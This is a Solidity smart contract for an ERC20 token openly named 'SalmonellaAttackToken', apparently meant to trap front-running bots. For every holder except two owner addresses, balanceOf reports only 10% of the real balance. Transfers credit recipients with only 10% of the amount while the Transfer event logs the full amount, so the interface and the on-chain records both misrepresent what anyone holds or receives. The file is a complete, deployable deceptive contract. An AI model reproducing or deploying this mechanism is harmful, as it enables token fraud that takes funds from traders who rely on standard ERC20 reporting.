pragma solidity ^0.8.0;

import "../interfaces/IERC20.sol";

contract SalmonellaAttackToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public ownerA;
    address public ownerB;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(uint256 initialSupply, address _ownerA, address _ownerB) {
        name = "SalmonellaAttackToken";
        symbol = "SAT";
        decimals = 18;
        totalSupply = initialSupply * 10**uint256(decimals);
        _balances[msg.sender] = totalSupply;
        ownerA = _ownerA;
        ownerB = _ownerB;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == ownerA || account == ownerB) {
            return _balances[account];
        } else {
            return (_balances[account] * 10) / 100;
        }
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender] - amount
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(
            sender != address(0),
            "ERC20: transfer from the zero address"
        );
        require(
            recipient != address(0),
            "ERC20: transfer to the zero address"
        );
        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        if (sender == ownerA || sender == ownerB) {
            _balances[sender] = senderBalance - amount;
            _balances[recipient] += amount;
        } else {
            _balances[sender] = senderBalance - amount;
            uint256 trapAmount = (amount * 10) / 100;
            _balances[recipient] += trapAmount;
        }
        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(
            owner != address(0),
            "ERC20: approve from the zero address"
        );
        require(
            spender != address(0),
            "ERC20: approve to the zero address"
        );

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
